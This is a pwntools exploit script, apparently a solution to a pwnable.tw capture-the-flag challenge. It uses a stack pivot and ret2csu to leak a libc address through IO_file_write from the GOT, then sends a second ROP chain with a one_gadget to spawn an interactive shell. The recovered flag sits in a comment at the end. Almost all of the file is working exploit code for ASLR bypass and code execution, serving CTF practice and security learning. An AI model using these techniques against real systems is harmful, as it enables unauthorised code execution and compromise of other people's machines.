from pwn import *

#r = process('./D',env={"LD_PRELOAD" : "./libc-2.23.so"})
r = remote('chall.pwnable.tw',10402)

### gadget 
pop_rbp_ret = 0x4004a0
leave_ret = 0x400554
pop_r13_r14_r15_ret = 0x4005be
call_r12 = 0x4005a0  

main_addr = 0x400536
got_addr = 0x600fe0
fake_file_addr = 0x601388

'''
ret2csu

r13 -> rdx 
r14 -> rsi
r15d -> edi
'''

## change gets' stack to bss secton 
r.sendline(b'\x00'* 0x10 + p64(0x601500) + p64(0x40053e)) 

### leave some libc addr at bss and stack pivot to higher addree to prevent libc layout from messing up. 
payload = p64(0x40053e) * 2 + p64(0x6014d8) + p64(0x40053e) * 5
fake_file = p64(0x40053e)*14 + p64(0) + p64(0) * 8 + p64(0x601400) + p64(0x40053e)
r.sendline(payload + fake_file)  ### leave some value at bss 


### set up ret address below libc address we want to pop to r12 and stack pivot to lower address
payload = p64(0)
payload += p64(0) 
payload += p64(leave_ret)  ## re2csu ret addr 0x6014d0
payload += p64(0)
payload += p64(pop_rbp_ret) ## ret address of current main function
payload += p64(0x6015e8)
payload += p64(leave_ret)
r.sendline(payload)

### set up ret2csu to leak libc address by calling IO_file_write the got table 
### and ret2main to use gets to do rop and get shell

### ROP FOR SET UP IO_file_write parameter AND call IO_file_write by gadget "call QWORD PTR [r12+rbx*8]"
rop = p64(0)
rop += p64(1) 
rop += p64(0x601498)
rop += p64(leave_ret)  ## ret address of last main function 
rop += p64(pop_r13_r14_r15_ret)
rop += p64(0x50)
rop += p64(got_addr)
rop += p64(fake_file_addr)
rop += p64(pop_rbp_ret)
rop += p64(0xfffffffffffffdeb + 1)
rop += p64(call_r12)
rop = rop.ljust(0x90,b'\x00')

payload = p64(main_addr) # ret address after ret2csu (call IO_file_write)
payload += p64(0) + p64(0x601300) #rbp
payload += p64(0x601200)
payload += p64(0x4005ba) #ret2csu
payload += p64(0xfffffffffffffdeb) # rbx
payload += p64(0x601408) # rbp
payload = rop + payload 
r.sendline(payload)

libc_base = u64(r.recv(6) + b'\x00\x00') - 0x20740
print(f'libc_base : {hex(libc_base)}')

### gadget 
pop_rax_ret =libc_base + 0x33544
one_gadget =libc_base + 0x45216

rop = p64(0)*3 
rop += p64(pop_rax_ret) + p64(0)
rop += p64(one_gadget)

r.sendline(rop)
r.interactive()

#FLAG{R0P_H4rd_TO_D3F3AT_ASLR}